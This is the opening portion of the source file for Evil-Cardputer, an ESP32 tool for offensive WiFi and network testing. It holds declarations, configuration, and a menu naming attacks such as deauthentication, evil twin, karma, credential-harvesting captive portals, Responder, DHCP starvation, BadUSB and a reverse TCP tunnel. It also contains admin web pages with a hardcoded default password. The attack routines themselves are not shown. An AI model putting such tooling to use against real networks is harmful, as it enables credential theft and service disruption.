/*
   Evil-Cardputer - WiFi Network Testing and Exploration Tool

   Copyright (c) 2025 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-Cardputer, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-Cardputer
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/

struct StreamItem;
struct UrlParts;
struct UrlPartsCrawl;
struct AtItem;
struct FakeTag;

typedef struct {
  uint32_t state[4];
  uint32_t count[2];
  uint8_t buffer[64];
} MD4_CTX;

typedef struct {
  uint32_t state[4];   // A, B, C, D
  uint32_t count[2];   // nb bits (mod 2^64)
  uint8_t  buffer[64]; // bloc en cours
} MD5U_CTX;

enum SearchKind {
  SK_All,
  SK_Root,
  SK_UUID,
  SK_DevType,
  SK_Other
};


#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <M5Unified.h>
#include <vector>
#include <string>
#include <array>
#include <set>
#include <TinyGPSPlus.h>
#include <Adafruit_NeoPixel.h> //led
#include "M5Cardputer.h"
#include <ArduinoJson.h>
#include <esp_now.h>

#include "BLEDevice.h"
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

#include <esp_task_wdt.h>

#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <WiFiClient.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

// Forward declarations for menu entries defined later
void FindMyEvilTx();
void listUPnPMappings();
void upnpTargetNATWorkflow();
void runLDAPDomainDump();
// Settings helpers (prototypes)
void toggleStartAtBoot();
void setBootStartCase();
void setBootCountdown();

//deauth
#include "esp_wifi_types.h"
#include "esp_event_loop.h"
//deauth end

//sniff and deauth client
#include "esp_err.h"
#include "nvs_flash.h"
#include <map>
#include <algorithm>
#include <regex>
//sniff and deauth client end

#include <IniFile.h>

String scanIp = "";
#include <lwip/etharp.h>
#include <lwip/ip_addr.h>
#include <ESPping.h>

//ssh
#include "libssh_esp32.h"
#include <libssh/libssh.h>


String ssh_user = "";
String ssh_host = "";
String ssh_password = "";
int ssh_port = 22;


// SSH session and channel
ssh_session my_ssh_session;
ssh_channel my_channel;
//ssh end

String tcp_host = "";
int tcp_port = 4444;

extern "C" {
#include "esp_wifi.h"
#include "esp_system.h"
}

bool ledOn = true;
bool soundOn = true;
bool randomOn = false;

static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;

WebServer server(80);
DNSServer dnsServer;
IPAddress ipAP;    // Adresse IP du mode AP
IPAddress ipSTA;   // Adresse IP du mode STA
bool useAP = true; // Alterner entre AP et STA
const byte DNS_PORT = 53;

int currentIndex = 0, lastIndex = -1;
bool inMenu = true;
static const char * const PROGMEM menuItems[] = {
  "Scan WiFi",
  "Select Network",
  "Clone & Details",
  "Set Wifi SSID",
  "Set Wifi Password",
  "Set Mac Address",
  "Start Captive Portal",
  "Stop Captive Portal",
  "Change Portal",
  "Check Credentials",
  "Delete All Creds",
  "Monitor Status",
  "Probe Attack",
  "Probe Sniffing",
  "Karma Attack",
  "Karma Auto",
  "Karma Spear",
  "Select Probe",
  "Delete Probe",
  "Delete All Probes",
  "Wardriving",
  "Wardriving Master",
  "Beacon Spam",
  "Deauther",
  "Auto Deauther",
  "Evil Twin",
  "Handshake Master",
  "WiFi Raw Sniffing",
  "Sniff Raw Clients",
  "Wifi Channel Visualizer",
  "Client Sniffing and Deauth",
  "Handshake/Deauth Sniffing",
  "Check Handshakes",
  "Wall Of Flipper",
  "Connect to network",
  "SSH Shell",
  "Scan IP Ports",
  "Scan Network Hosts",
  "Scan Network Full",
  "Scan Network List",
  "Web Crawler",
  "PwnGrid Spam",
  "Skimmer Detector",
  "Mouse Jiggler",
  "BadUSB",
  "Bluetooth Keyboard",
  "Reverse TCP Tunnel",
  "DHCP Starvation",
  "Rogue DHCP STA",
  "Rogue DHCP AP",
  "Switch DNS",
  "Network Hijacking",
  "Detect Printer",
  "File Print",
  "Check printer status",
  "HoneyPot",
  "LLM Chat Stream",
  "EvilChatMesh",
  "SD on USB",
  "Responder",
  "WPAD Abuse",
  "Crack NTLMv2",
  "Clean NTLMv2 duplicate",
  "FileManager",
  "UART Shell",
  "SIP Scanner",
  "SIP Enumeration",
  "SIP Message Spoof",
  "SIP Flooding",
  "SIP Ring All",
  "CCTV Toolkit",
  "SSDP Poisoner",
  "SkyJack",
  "WiFi Dead Drop",
  "BLENameFlood",
  "Wall Of Airtag",
  "FindMyEvil",
  "List UPnP Mapping",
  "UPnP NAT",
  "LDAPDump",
  "Settings",
};


const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);

const int maxMenuDisplay = 9;
int menuStartIndex = 0;

static std::vector<String> ssidList;
int numSsid = 0;

bool isOperationInProgress = false;
int currentListIndex = 0;
String clonedSSID = "Evil-Cardputer";
int topVisibleIndex = 0;

// Connect to nearby wifi network automaticaly to provide internet to the cardputer you can be connected and provide AP at same time
String ssid = "";
String password = "";

// password for web access to remote check captured credentials and send new html file
String accessWebPassword = "7h30th3r0n3";
// Scan state for web UI (polled by /scan-status)
volatile bool scanInProgress = false;

// --- Admin web authentication (Basic Auth) ---
static const char* ADMIN_USER  = "evil";

// Returns true if the client is authenticated. If not, triggers a 401 challenge and returns false.
// Also sets conservative security headers for subsequent responses on success.
bool guardAdmin() {
  if (server.authenticate(ADMIN_USER, accessWebPassword.c_str())) {
    server.sendHeader("Cache-Control", "no-store");
    server.sendHeader("X-Content-Type-Options", "nosniff");
    server.sendHeader("X-Frame-Options", "DENY");
    server.sendHeader("Referrer-Policy", "no-referrer");
    server.sendHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=()");
    return true;
  }
  server.requestAuthentication();
  return false;
}

// ---- Shared Admin UI helpers (unified look & feel) ----
static String adminPageStart(const String &title) {
  String html;
  html += F("<!doctype html><html lang=\"en\"><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>");
  html += title;
  html += F("</title><style>");
  // Base theme (matches /admin aesthetics)
  html += F(":root{--bg0:#0b1020;--bg1:#0f1a33;--card:rgba(255,255,255,.10);--card2:rgba(255,255,255,.14);--txt:#e9eefc;--mut:rgba(233,238,252,.72);--st:rgba(255,255,255,.14);--acc:#4c7dff;--acc2:#28a745;--r:16px;--sh:0 18px 60px rgba(0,0,0,.42)}");
  html += F("@media(prefers-color-scheme:light){:root{--bg0:#f4f7ff;--bg1:#eef2ff;--card:rgba(255,255,255,.92);--card2:rgba(255,255,255,.98);--txt:#0e1730;--mut:rgba(14,23,48,.66);--st:rgba(14,23,48,.12);--sh:0 18px 60px rgba(14,23,48,.14)}}");
  html += F("*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:22px;color:var(--txt);font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:radial-gradient(1200px 600px at 15% 10%,rgba(76,125,255,.35),transparent 60%),radial-gradient(900px 500px at 85% 20%,rgba(40,215,198,.22),transparent 55%),linear-gradient(160deg,var(--bg0),var(--bg1))}");
  html += F(".wrap{width:100%;max-width:720px;background:linear-gradient(180deg,var(--card2),var(--card));border:1px solid var(--st);border-radius:var(--r);box-shadow:var(--sh);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);overflow:hidden}");
  html += F(".hd{padding:16px 16px 10px;border-bottom:1px solid var(--st);display:flex;justify-content:space-between;align-items:center;gap:10px}");
  html += F(".tt{margin:0;font-size:18px;letter-spacing:.2px}.sub{margin:0;font-size:12px;color:var(--mut)}");
  html += F(".ct{padding:16px;display:block}");
  html += F(".btn{display:inline-flex;align-items:center;gap:8px;padding:10px 12px;border-radius:12px;text-decoration:none;color:var(--txt);background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.10)}");
  html += F(".btn.p{border-color:transparent;background:linear-gradient(135deg,var(--acc),#6ad9ff);color:#0b1020;font-weight:600}");
  html += F(".btn.g{border-color:transparent;background:linear-gradient(135deg,var(--acc2),#41e18d);color:#0b1020;font-weight:600}");
  html += F(".btn:hover{transform:translateY(-1px);background:rgba(255,255,255,.10);border-color:rgba(255,255,255,.18)}");
  html += F(".row{display:flex;gap:10px;flex-wrap:wrap;margin:8px 0}");
  // Inputs: ensure good contrast in both themes, including native white controls
  html += F("input,select,textarea{width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(255,255,255,.18);background:rgba(255,255,255,.06);color:var(--txt);outline:none}");
  html += F("@media(prefers-color-scheme:light){input,select,textarea{background:#fff;border-color:#d5d5d5;color:#0e1730}}");
  html += F("select option{color:#0e1730;background:#fff}");
  html += F("textarea{min-height:320px}");
  // Tables: improved styling for monitor status and others
  html += F("table{width:100%;border-collapse:separate;border-spacing:0;background:rgba(255,255,255,.04);border:1px solid var(--st);border-radius:12px;overflow:hidden}");
  html += F("th{background:rgba(255,255,255,.08);font-weight:650}");
  html += F("th,td{border-bottom:1px solid var(--st);padding:10px 12px;text-align:left}");
  html += F("tr:nth-child(even) td{background:rgba(255,255,255,.03)}");
  html += F("tr:last-child td{border-bottom:none}");
  html += F("ul{list-style:none;padding:0;margin:0}li{padding:8px 10px;border:1px solid var(--st);border-radius:10px;margin:8px 0;background:rgba(255,255,255,.06)}li a{color:var(--txt);text-decoration:none}");
  html += F(".actions{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0}");
  html += F(".mut{color:var(--mut)}.right{margin-left:auto}");
  // Horizontal scroll helpers for narrow screens
  html += F(".scroll-x{width:100%;overflow:auto;-webkit-overflow-scrolling:touch}");
  html += F("table.wide{min-width:720px}");
  html += F("table.wide th,table.wide td{white-space:nowrap}");
  // Extra components used by upload UI
  html += F("#dropZone{width:100%;padding:16px;border:1px dashed var(--acc);border-radius:12px;color:var(--acc);background:rgba(76,125,255,.10);cursor:pointer;transition:.18s}");
  html += F("#dropZone.dragover{background:rgba(76,125,255,.18)}");
  html += F("#fileList{font-size:13px;max-height:220px;overflow:auto}");
  html += F("#progressBar{width:100%;height:10px;background:rgba(255,255,255,.12);border-radius:6px;overflow:hidden}");
  html += F("#progressFill{height:100%;width:0%;background:linear-gradient(135deg,var(--acc),#6ad9ff)}");
  html += F("#doneBox{display:none;margin-top:10px;padding:10px;background:linear-gradient(135deg,var(--acc2),#41e18d);color:#0b1020;border-radius:10px;font-size:13px;font-weight:600}");
  html += F("</style><body><div class=\"wrap\"><div class=\"hd\"><div><h2 class=\"tt\">");
  html += title;
  html += F("</h2><p class=\"sub\">Admin â€¢ Unified UI</p></div><div class=\"right\"><a class=\"btn\" href=\"/evil-menu\">Menu</a></div></div><div class=\"ct\">");
  return html;
}

static String adminPageEnd() {
  return String(F("</div></div></body></html>"));
}

static String wrapAdminPage(const String &title, const String &content) {
  String h = adminPageStart(title);
  h += content;
  h += adminPageEnd();
  return h;
}

// Minimal HTML escape to safely display file content
static String htmlEscape(const String &in) {
  String out; out.reserve(in.length());
  for (size_t i = 0; i < in.length(); ++i) {
    char c = in[i];
    switch (c) {
      case '&': out += F("&amp;"); break;
      case '<': out += F("&lt;"); break;
      case '>': out += F("&gt;"); break;
      case '"': out += F("&quot;"); break;
      case '\'': out += F("&#39;"); break;
      default: out += c; break;
    }
  }
  return out;
}

// Minimal JSON string escape (for simple ASCII content)
static String jsonEscape(const String &in) {
  String out; out.reserve(in.length());
  for (size_t i = 0; i < in.length(); ++i) {
    char c = in[i];
    switch (c) {
      case '"': out += F("\\\""); break;
      case '\\': out += F("\\\\"); break;
      case '\n': out += F("\\n"); break;
      case '\r': out += F("\\r"); break;
      case '\t': out += F("\\t"); break;
      default:
        if ((uint8_t)c < 0x20) { /* skip control */ }
        else out += c;
        break;
    }
  }
  return out;
}

// Embedded modern admin panel (single page) for quick trial under /admin-modern
static const char* MODERN_PANEL_HTML = R"rawliteral(
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Cardputer Admin â€” Modern</title>
  <style>
    :root{--bg:#0b0f14;--panel:#0f141a;--card:#121a22;--line:#1f2937;--text:#e5e7eb;--muted:#9ca3af;--accent:#6366f1;--accent-2:#22d3ee;--radius:14px;--shadow:0 10px 30px rgba(0,0,0,.35)}
    *{box-sizing:border-box} html,body{height:100%}
    body{margin:0;background:radial-gradient(1200px 800px at 120% -20%, rgba(34,211,238,.08), transparent 50%),radial-gradient(900px 700px at -20% 120%, rgba(99,102,241,.08), transparent 50%),linear-gradient(180deg, #0a0f14, var(--bg));color:var(--text);font:14px/1.55 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
    a{color:inherit}
    .topbar{position:sticky;top:0;z-index:20;display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:rgba(15,20,26,.75);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
    .brand{display:flex;align-items:center;gap:10px;font-weight:700}
    .logo{width:10px;height:10px;border-radius:3px;background:linear-gradient(135deg,var(--accent),var(--accent-2));box-shadow:0 0 18px rgba(99,102,241,.6)}
    .meta{color:var(--muted);font-size:12px}
    .actions{display:flex;align-items:center;gap:8px}
    .btn{display:inline-flex;align-items:center;gap:8px;color:var(--text);text-decoration:none;background:transparent;border:1px solid var(--line);padding:8px 12px;border-radius:10px}
    .btn.primary{border-color:transparent;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#0b0f14;font-weight:600}
    .layout{display:grid;grid-template-columns:240px 1fr;gap:14px;max-width:1200px;margin:16px auto;padding:0 16px}
    .sidebar{position:sticky;top:68px;align-self:start;background:rgba(18,26,34,.7);backdrop-filter:blur(6px);border:1px solid var(--line);border-radius:var(--radius);padding:10px;box-shadow:var(--shadow)}
    .side-title{margin:6px 10px;color:var(--muted);font-size:12px;letter-spacing:.06em;text-transform:uppercase}
    .nav{display:flex;flex-direction:column;gap:6px}
    .nav-link{display:flex;align-items:center;gap:10px;padding:9px 10px;border-radius:10px;text-decoration:none;color:var(--text);border:1px solid transparent}
    .nav-link:hover{background:#121a22}
    .nav-link.active{background:#121a22;border-color:#2c3744;box-shadow:inset 0 0 0 1px #1b2430}
    .content{min-height:70vh}
    .section{background:rgba(18,26,34,.7);backdrop-filter:blur(6px);border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow)}
    .section-head{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid var(--line)}
    .title{margin:0;font-weight:700}
    .section-body{padding:14px}
    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px}
    .card{position:relative;padding:14px;background:var(--card);border:1px solid #202a35;border-radius:12px;transition:transform .15s ease}
    .card:hover{transform:translateY(-2px)}
    .card h3{margin:0 0 6px 0}
    .muted{color:var(--muted)}
    .row{display:flex;gap:10px;flex-wrap:wrap}
    input,select{background:#0f151d;color:var(--text);border:1px solid #22303d;border-radius:10px;padding:10px}
    table{width:100%;border-collapse:separate;border-spacing:0}
    th,td{padding:10px;border-bottom:1px solid #1c2632;text-align:left}
    .actions a{color:var(--accent-2);text-decoration:none;margin-right:10px}
    .drop{border:1px dashed var(--accent);border-radius:10px;padding:16px;color:var(--muted)}
    .progress{height:8px;border-radius:999px;background:#0f151d;overflow:hidden}
    .bar{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent-2))}
  </style>
</head>
<body>
  <header class="topbar">
    <div class="brand"><div class="logo"></div> Cardputer Admin <span class="meta">Â· Modern UI</span></div>
    <div class="actions">
      <div class="meta">STA 192.168.0.42 Â· AP 192.168.4.1</div>
      <a class="btn" href="#">Settings</a>
      <a class="btn primary" href="#">Logout</a>
    </div>
  </header>
  <main class="layout">
    <aside class="sidebar section">
      <div class="side-title">Navigation</div>
      <nav class="nav">
        <a class="nav-link active" data-view="dashboard" href="#">Dashboard</a>
        <a class="nav-link" data-view="files" href="#">Files</a>
        <a class="nav-link" data-view="upload" href="#">Upload</a>
        <a class="nav-link" data-view="portal" href="#">Portal</a>
        <a class="nav-link" data-view="monitor" href="#">Monitor</a>
        <a class="nav-link" data-view="scan" href="#">Scan</a>
        <a class="nav-link" data-view="credentials" href="#">Credentials</a>
        <a class="nav-link" data-view="badusb" href="#">BadUSB</a>
      </nav>
      <div class="side-title">Status</div>
      <div class="section-body" style="padding:10px; color:var(--muted)">Clients: 3<br/>Battery: 86%<br/>RAM: 132 KB</div>
    </aside>
    <section class="content">
      <div class="section">
        <div class="section-head"><h2 class="title" id="title">Dashboard</h2></div>
        <div class="section-body">
          <div id="view-dashboard" class="view">
            <div class="grid">
              <a class="card" href="#" data-jump="files"><h3>Files</h3><div class="muted">Browse SD card</div></a>
              <a class="card" href="#" data-jump="upload"><h3>Upload</h3><div class="muted">Drag & drop files</div></a>
              <a class="card" href="#" data-jump="portal"><h3>Portal</h3><div class="muted">Captive portal</div></a>
              <a class="card" href="#" data-jump="monitor"><h3>Monitor</h3><div class="muted">Live device stats</div></a>
              <a class="card" href="#" data-jump="scan"><h3>Scan</h3><div class="muted">Network analysis</div></a>
              <a class="card" href="#" data-jump="credentials"><h3>Credentials</h3><div class="muted">Saved logins</div></a>
              <a class="card" href="#" data-jump="badusb"><h3>BadUSB</h3><div class="muted">Run scripts</div></a>
            </div>
          </div>
          <div id="view-files" class="view" hidden>
            <div class="row" style="margin-bottom:10px"><input value="/"/><a class="btn" href="#">Open</a></div>
            <table>
              <tr><th>Name</th><th>Size</th><th>Actions</th></tr>
              <tr><td>/evil</td><td>dir</td><td class="actions"><a href="#">Open</a></td></tr>
              <tr><td>/evil/credentials.txt</td><td>1.2 KB</td><td class="actions"><a href="#">Download</a> <a href="#">Edit</a> <a href="#">Delete</a></td></tr>
            </table>
          </div>
          <div id="view-upload" class="view" hidden>
            <div class="row"><select><option>/</option><option>/evil</option><option>/evil/sites</option></select><input type="file" multiple/><a class="btn primary" href="#" id="btnUp">Upload</a></div>
            <div class="drop" id="drop">Drop files here</div>
            <div class="progress" style="margin-top:10px"><div class="bar" id="bar"></div></div>
          </div>
          <div id="view-portal" class="view" hidden>
            <div class="row"><input placeholder="SSID / Portal name"/><input type="password" placeholder="Password (optional)"/><select><option>login.html</option></select></div>
            <div class="row" style="margin-top:10px"><a class="btn" href="#">Save</a><a class="btn primary" href="#">Start</a><a class="btn" href="#">Stop</a></div>
          </div>
          <div id="view-monitor" class="view" hidden>
            <div class="grid">
              <div class="card"><h3>Wiâ€‘Fi</h3><div class="muted">Connected: YES</div></div>
              <div class="card"><h3>IP</h3><div class="muted">192.168.0.42</div></div>
              <div class="card"><h3>Clients</h3><div class="muted">3</div></div>
              <div class="card"><h3>RAM</h3><div class="muted">132 KB</div></div>
            </div>
          </div>
          <div id="view-scan" class="view" hidden>
            <div class="row"><a class="btn primary" href="#" id="btnScan">Start Scan</a></div>
            <table id="scanTable" style="margin-top:10px"><tr><th>Step</th><th>Status</th></tr></table>
          </div>
          <div id="view-credentials" class="view" hidden>
            <table><tr><th>Login</th><th>Action</th></tr>
              <tr><td>user@example.com : hunter2</td><td class="actions"><a href="#">Download</a></td></tr>
            </table>
          </div>
          <div id="view-badusb" class="view" hidden>
            <table><tr><th>Script</th><th>Action</th></tr>
              <tr><td>hello_world.txt</td><td class="actions"><a href="#">Run</a></td></tr>
            </table>
          </div>
        </div>
      </div>
    </section>
  </main>
  <script>
    const links=[...document.querySelectorAll('.nav-link')];
    const title=document.getElementById('title');
    const views={dashboard:'view-dashboard', files:'view-files', upload:'view-upload', portal:'view-portal', monitor:'view-monitor', scan:'view-scan', credentials:'view-credentials', badusb:'view-badusb'};
    function show(name){ Object.values(views).forEach(id=>document.getElementById(id).hidden=true); const id=views[name]; if(id){ document.getElementById(id).hidden=false; title.textContent = name[0].toUpperCase() + name.slice(1); } }
    links.forEach(a=>a.addEventListener('click',e=>{e.preventDefault(); links.forEach(x=>x.classList.remove('active')); a.classList.add('active'); show(a.dataset.view); }));
    document.querySelectorAll('[data-jump]').forEach(c=>c.addEventListener('click',e=>{e.preventDefault(); const k=c.dataset.jump; document.querySelector(`.nav-link[data-view="${k}"]`).click(); }));
    show('dashboard');
    const drop=document.getElementById('drop'); const bar=document.getElementById('bar');
    if(drop){drop.addEventListener('dragover',e=>{e.preventDefault(); drop.style.borderColor='var(--accent-2)'});drop.addEventListener('dragleave',()=>{drop.style.borderColor='var(--accent)'});drop.addEventListener('drop',e=>{e.preventDefault(); drop.style.borderColor='var(--accent)'; let p=0; bar.style.width='0%'; const it=setInterval(()=>{p+=8; bar.style.width=p+'%'; if(p>=100) clearInterval(it);},80)});} const up=document.getElementById('btnUp'); if(up){ up.addEventListener('click',e=>{e.preventDefault(); let p=0; bar.style.width='0%'; const it=setInterval(()=>{p+=10; bar.style.width=p+'%'; if(p>=100) clearInterval(it);},70)}); }
    const btnScan=document.getElementById('btnScan'); const scanTable=document.getElementById('scanTable'); if(btnScan){ btnScan.addEventListener('click',e=>{e.preventDefault(); scanTable.innerHTML='<tr><th>Step</th><th>Status</th></tr>'; const steps=['Channels','APs','Hosts','Services','Done']; let i=0; const it=setInterval(()=>{ if(i<steps.length){ const tr=document.createElement('tr'); tr.innerHTML=`<td>${steps[i++]}</td><td>OK</td>`; scanTable.appendChild(tr);} else clearInterval(it); }, 480); }); }
  </script>
</body>
</html>
)rawliteral";

char ssid_buffer[32] = "";
char password_buffer[64] = "";

static std::vector<String> portalFiles; // dynamic list of portal files
int numPortalFiles = 0;
String selectedPortalFile = "/evil/sites/normal.html"; // defaut portal
int portalFileIndex = 0;

int nbClientsConnected = 0;
int nbClientsWasConnected = 0;
int nbPasswords = 0;
bool isCaptivePortalOn = false;


static const int MAC_MAX = 10;
static std::vector<String> macAddresses;
int numConnectedMACs = 0;       // nombre courant de clients


File fsUploadFile; // global variable for file upload

String captivePortalPassword = "";

// Probe Sniffind part

#define MAX_SSIDS_Karma 100

static std::vector<std::array<char,33>> ssidsKarma;
inline void ensureKarmaStorage() {
  if ((int)ssidsKarma.size() < MAX_SSIDS_Karma) ssidsKarma.resize(MAX_SSIDS_Karma);
}
int ssid_count_Karma = 0;
bool isScanningKarma = false;
int currentIndexKarma = -1;
int menuStartIndexKarma = 0;
int menuSizeKarma = 0;
const int maxMenuDisplayKarma = 12;

enum AppState {
  StartScanKarma,
  ScanningKarma,
  StopScanKarma,
  SelectSSIDKarma
};

AppState currentStateKarma = StartScanKarma;

bool isProbeSniffingMode = false;
bool isProbeKarmaAttackMode = false;
bool isKarmaMode = false;

// Probe Sniffing end

// AutoKarma part

volatile bool newSSIDAvailable = false;
char lastSSID[33] = {0};
const int autoKarmaAPDuration = 15000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
bool isAutoKarmaActive = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
static bool isInitialDisplayDone = false;
char lastDeployedSSID[33] = {0};
bool karmaSuccess = false;

const int karmaChannels[] = {1, 6, 11};
const int numKarmaChannels = sizeof(karmaChannels) / sizeof(karmaChannels[0]);
int currentKarmaChannelIndex = 0;
unsigned long lastKarmaChannelSwitch = 0;
const unsigned long karmaChannelInterval = 333; // en ms

//AutoKarma end

//config file
const char* configFolderPath = "/evil/config";
const char* configFilePath = "/evil/config/config.txt";
// Boot launcher config
bool startAtBootFlag = false;      // if true, launch a menu case at boot
int  caseToStartAtBoot = -1;       // index of menuItems[] / executeMenuItem case
int  bootCountdownSeconds = 3;     // countdown before auto-start (0 = no countdown)
bool bootLaunchDone = false;       // internal guard to only trigger once
int defaultBrightness = 255 * 0.35;                         //  35% default Brightness
String selectedStartupImage = "/evil/img/startup-cardputer.jpg"; // Valeur par dÃ©faut
String selectedStartupSound = "/evil/audio/sample.mp3";          // Valeur par dÃ©faut
String selectedTheme = "/evil/theme.ini";                        // Selected Theme Default

std::vector<std::string> whitelist;
std::set<std::string> seenWhitelistedSSIDs;
//config file end

// THEME START
// Assign default theme values, ini in SD root can change them
int taskbarBackgroundColor      = TFT_NAVY;     // Taskbar background color
int taskbarTextColor            = TFT_GREEN;  // Taskbar Textcolor
int taskbarDividerColor         = TFT_PURPLE;     // Taskbar divider color
int menuBackgroundColor         = TFT_BLACK;     // Menu background color
int menuSelectedBackgroundColor = TFT_NAVY;  // Color for bar that highlights selected item
int menuTextFocusedColor        = TFT_GREEN;     // Text color for currently selected item
int menuTextUnFocusedColor      = TFT_WHITE; // Text color for items that are not the currently selected
bool Colorful                   = true;
// THEME END

//led part

#define PIN 21
//#define PIN 25 // for M5Stack Core AWS comment above and uncomment this line
#define NUMPIXELS 1

Adafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_GRB);
int delayval = 100;


void setColorRange(int startPixel, int endPixel, uint32_t color) {
  for (int i = startPixel; i <= endPixel; i++) {
    pixels.setPixelColor(i, color);
  }
  pixels.show();
  delay(30);
}

//led part end

bool isItSerialCommand = false;


// deauth and pwnagotchi detector part
const long channelHopInterval = 5000; // hoppping time interval
unsigned long lastChannelHopTime = 0;
int currentChannelDeauth = 1;
bool autoChannelHop = false; // Commence en mode auto
int lastDisplayedChannelDeauth = -1;
bool lastDisplayedMode = !autoChannelHop; // Initialisez Ã  l'opposÃ© pour forcer la premiÃ¨re mise Ã  jour
unsigned long lastScreenClearTime = 0; // Pour suivre le dernier effacement de l'Ã©cran
char macBuffer[18];
int maxChannelScanning = 13;

int nombreDeHandshakes = 0; // Nombre de handshakes/PMKID capturÃ©s
int nombreDeDeauth = 0;
int nombreDeEAPOL = 0;
File pcapFile;
// deauth and pwnagotchi detector end

// Sniff and deauth clients
std::map<std::string, std::vector<std::string>> connections;
std::map<std::string, std::string> ap_names;
std::set<int> ap_channels;
std::map<std::string, int> ap_channels_map;

//If you change these value you need to change it also in the code on deauthClients function
unsigned long lastScanTime = 0;
unsigned long scanInterval = 90000; // interval of deauth and scanning network

unsigned long lastChannelChange = 0;
unsigned long channelChangeInterval = 15000; // interval of channel switching

unsigned long lastClientPurge = 0;
unsigned long clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore

unsigned long deauthWaitingTime = 5000; //interval of time to capture EAPOL after sending deauth frame
static unsigned long lastPrintTime = 0;

int nbDeauthSend = 10;

bool isDeauthActive = false;
bool isDeauthFast = false;

// Sniff and deauth clients end

int baudrate_gps = 115200;
TinyGPSPlus gps;
HardwareSerial cardgps(2); // Create a HardwareSerial object on UART2
int gpsRxPin;
int gpsTxPin;
int gpsPinsMode = -1; // -1=auto(by board), 0=1/2, 1=15/13

//webcrawling
void webCrawling(const String &urlOrIp = "");
void webCrawling(const IPAddress &ip);
//webcrawling end


//taskbar
M5Canvas taskBarCanvas(&M5.Display); // Framebuffer pour la barre de tÃ¢ches
static bool taskBarSpriteReady = false;
//taskbar end



//badusb

#include <USBHIDKeyboard.h>

#include <USBHIDMouse.h>

#include <USB.h>
#include <functional>
#define DEF_DELAY 50

USBHIDKeyboard Kb;
bool kbChosen = false;
//badusb end



//mp3

#include <AudioOutput.h>
#include <AudioFileSourceSD.h>
#include <AudioFileSourceID3.h>
#include <AudioGeneratorMP3.h>

// Classe AudioOutputM5Speaker spÃ©cifique Ã  votre projet
class AudioOutputM5Speaker : public AudioOutput {
  public:
    AudioOutputM5Speaker(m5::Speaker_Class* m5sound, uint8_t virtual_sound_channel = 0) {
      _m5sound = m5sound;
      _virtual_ch = virtual_sound_channel;
    }
    virtual ~AudioOutputM5Speaker(void) {};
    virtual bool begin(void) override {
      return true;
    }
    virtual bool ConsumeSample(int16_t sample[2]) override {
      if (_tri_buffer_index < tri_buf_size) {
        _tri_buffer[_tri_index][_tri_buffer_index  ] = sample[0];
        _tri_buffer[_tri_index][_tri_buffer_index + 1] = sample[1];
        _tri_buffer_index += 2;
        return true;
      }
      flush();
      return false;
    }
    virtual void flush(void) override {
      if (_tri_buffer_index) {
        _m5sound->playRaw(_tri_buffer[_tri_index], _tri_buffer_index, hertz, true, 1, _virtual_ch);
        _tri_index = _tri_index < 2 ? _tri_index + 1 : 0;
        _tri_buffer_index = 0;
      }
    }
    virtual bool stop(void) override {
      flush();
      _m5sound->stop(_virtual_ch);
      return true;
    }

  protected:
    m5::Speaker_Class* _m5sound;
    uint8_t _virtual_ch;
    static constexpr size_t tri_buf_size = 128;
    int16_t _tri_buffer[3][tri_buf_size];
    size_t _tri_buffer_index = 0;
    size_t _tri_index = 0;
};

// Initialisation des objets pour la lecture audio
static AudioFileSourceSD file;
static AudioOutputM5Speaker out(&M5.Speaker);
static AudioGeneratorMP3 mp3;
static AudioFileSourceID3* id3 = nullptr;

